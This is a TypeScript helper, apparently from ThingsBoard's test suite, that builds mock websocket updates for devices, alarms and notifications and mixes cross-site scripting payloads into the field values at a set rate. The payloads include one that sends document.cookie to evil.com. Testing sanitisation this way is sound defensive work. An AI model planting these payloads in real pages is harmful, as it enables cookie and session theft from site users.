///
/// Copyright © 2016-2026 The Thingsboard Authors
///
/// Licensed under the Apache License, Version 2.0 (the "License");
/// you may not use this file except in compliance with the License.
/// You may obtain a copy of the License at
///
///     http://www.apache.org/licenses/LICENSE-2.0
///
/// Unless required by applicable law or agreed to in writing, software
/// distributed under the License is distributed on an "AS IS" BASIS,
/// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
/// See the License for the specific language governing permissions and
/// limitations under the License.
///

const XSS_PAYLOADS = [
  '<script>alert("xss")</script>',
  '<img src=x onerror="alert(document.cookie)">',
  '<div onclick="fetch(\'https://evil.com/steal?c=\'+document.cookie)">click</div>',
  '<iframe src="javascript:alert(1)"></iframe>',
  '<svg onload="alert(1)"><circle r="50"/></svg>',
  '<a href="javascript:void(0)" onmouseover="alert(1)">hover me</a>',
  '<object data="data:text/html,<script>alert(1)</script>"></object>',
  '<embed src="data:text/html,<script>alert(1)</script>">',
  '<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">',
  '<details open ontoggle="alert(1)"><summary>XSS</summary></details>',
];

const PLAIN_VALUES = [
  'Device A', 'Sensor #42', 'Online', 'Offline', 'Firmware v2.1.3',
  'Room 101', 'Building B', 'active', 'inactive', 'warning',
  'Berlin, Germany', 'Temperature Sensor', 'Main Gateway', 'Edge Node 5',
  '{"threshold": 30, "unit": "celsius"}', '[1, 2, 3, 4, 5]',
];

function randomValue(htmlPercent: number): string {
  if (Math.random() * 100 < htmlPercent) {
    return XSS_PAYLOADS[Math.floor(Math.random() * XSS_PAYLOADS.length)];
  }
  if (Math.random() < 0.6) {
    return (Math.random() * 100).toFixed(2);
  }
  return PLAIN_VALUES[Math.floor(Math.random() * PLAIN_VALUES.length)];
}

function randomTs(): number {
  return 1709000000000 + Math.floor(Math.random() * 1000000);
}

export function generateSubscriptionUpdate(keyCount: number, htmlPercent: number): any {
  const data: any = {};
  for (let i = 0; i < keyCount; i++) {
    data[`key_${i}`] = [[randomTs(), randomValue(htmlPercent)]];
  }
  return {
    subscriptionId: 1,
    errorCode: 0,
    errorMsg: '',
    data,
  };
}

export function generateEntityDataUpdate(
  entityCount: number,
  attrsPerEntity: number,
  tsPointsPerKey: number,
  htmlPercent: number,
): any {
  const entities: any[] = [];
  for (let i = 0; i < entityCount; i++) {
    const latest: any = { ATTRIBUTE: {} };
    for (let a = 0; a < attrsPerEntity; a++) {
      latest.ATTRIBUTE[`attr_${a}`] = { ts: randomTs(), value: randomValue(htmlPercent) };
    }
    const timeseries: any = {};
    if (tsPointsPerKey > 0) {
      timeseries.series_0 = [];
      for (let t = 0; t < tsPointsPerKey; t++) {
        timeseries.series_0.push({ ts: randomTs() + t * 1000, value: randomValue(htmlPercent) });
      }
    }
    entities.push({
      entityId: { id: `device-${i}`, entityType: 'DEVICE' },
      latest,
      timeseries,
    });
  }
  return {
    cmdId: 1,
    cmdUpdateType: 'ENTITY_DATA',
    data: { data: entities },
  };
}

export function generateAlarmDataUpdate(alarmCount: number, htmlPercent: number): any {
  const alarms: any[] = [];
  for (let i = 0; i < alarmCount; i++) {
    const latest: any = { ATTRIBUTE: {} };
    for (let a = 0; a < 3; a++) {
      latest.ATTRIBUTE[`attr_${a}`] = { ts: randomTs(), value: randomValue(htmlPercent) };
    }
    alarms.push({
      id: { id: `alarm-${i}`, entityType: 'ALARM' },
      createdTime: randomTs(),
      type: randomValue(htmlPercent),
      severity: 'CRITICAL',
      status: 'ACTIVE_UNACK',
      latest,
    });
  }
  return {
    cmdId: 2,
    cmdUpdateType: 'ALARM_DATA',
    allowedEntities: alarmCount,
    totalEntities: alarmCount,
    data: { data: alarms },
  };
}

export function generateNotificationsUpdate(count: number, htmlPercent: number): any {
  const notifications: any[] = [];
  for (let i = 0; i < count; i++) {
    notifications.push({
      id: { id: `notif-${i}`, entityType: 'NOTIFICATION' },
      subject: randomValue(htmlPercent),
      text: randomValue(htmlPercent),
      type: 'GENERAL',
      status: 'SENT',
      createdTime: randomTs(),
    });
  }
  return {
    cmdId: 3,
    cmdUpdateType: 'NOTIFICATIONS',
    totalUnreadCount: count,
    sequenceNumber: 1,
    notifications,
  };
}
